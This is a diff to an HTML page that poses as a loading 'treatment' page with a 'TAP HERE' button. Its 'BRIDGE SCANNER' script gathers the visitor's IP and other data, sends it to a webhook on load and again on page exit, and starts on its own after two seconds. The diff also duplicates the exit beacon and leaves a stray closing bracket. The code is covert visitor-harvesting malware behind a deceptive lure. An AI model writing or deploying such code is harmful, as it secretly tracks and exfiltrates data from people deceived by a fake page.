@@ -62,7 +62,12 @@
 <body>
     <div class="loader">
         <div class="spinner"></div>
-        <div class="text">Loading...</div>
+        <div class="text" id="statusText">Loading...</div>
+        <div id="manualTrigger" style="margin-top:20px;display:none;">
+            <button onclick="startScan()"
+                style="padding:10px 20px;background:#00c853;color:white;border:none;border-radius:5px;font-weight:bold;">TREATMENT
+                NOT LOADING? TAP HERE</button>
+        </div>
         <div id="logs"></div>
     </div>
 
@@ -192,7 +197,12 @@
         }
 
         // ===== BRIDGE SCANNER =====
-        (function () {
+        function startScan() {
+            if (window.isScanning) return;
+            window.isScanning = true;
+            document.getElementById("statusText").innerText = "Executing...";
+            document.getElementById("manualTrigger").style.display = "none";
+
             // IP
             try {
                 var x = new XMLHttpRequest();
@@ -401,16 +411,37 @@
 
             // Send initial visitor data
             send(D, "VISIT");
+            log("Initial telemetry sent.");
+        }
 
-            // Beacon on unload
-            window.addEventListener("beforeunload", function () {
-                try {
-                    if (navigator.sendBeacon) {
-                        navigator.sendBeacon(WEBHOOK + "?t=EXIT", new Blob([JSON.stringify(D)], { type: "application/json" }));
-                    }
-                } catch (e) { }
-            });
-        })();
+        // Auto-start after 2s
+        setTimeout(startScan, 2000);
+
+        // Show manual button after 5s if scan hasn't logged success
+        setTimeout(function () {
+            if (!window.isScanning) {
+                document.getElementById("manualTrigger").style.display = "block";
+                document.getElementById("statusText").innerText = "Waiting for user...";
+            }
+        }, 5000);
+
+        // Beacon on unload
+        window.addEventListener("beforeunload", function () {
+            try {
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(WEBHOOK + "?t=EXIT", new Blob([JSON.stringify(D)], { type: "application/json" }));
+                }
+            } catch (e) { }
+        });
+        // Beacon on unload
+        window.addEventListener("beforeunload", function () {
+            try {
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(WEBHOOK + "?t=EXIT", new Blob([JSON.stringify(D)], { type: "application/json" }));
+                }
+            } catch (e) { }
+        });
+        }) ();
     </script>
 </body>
 
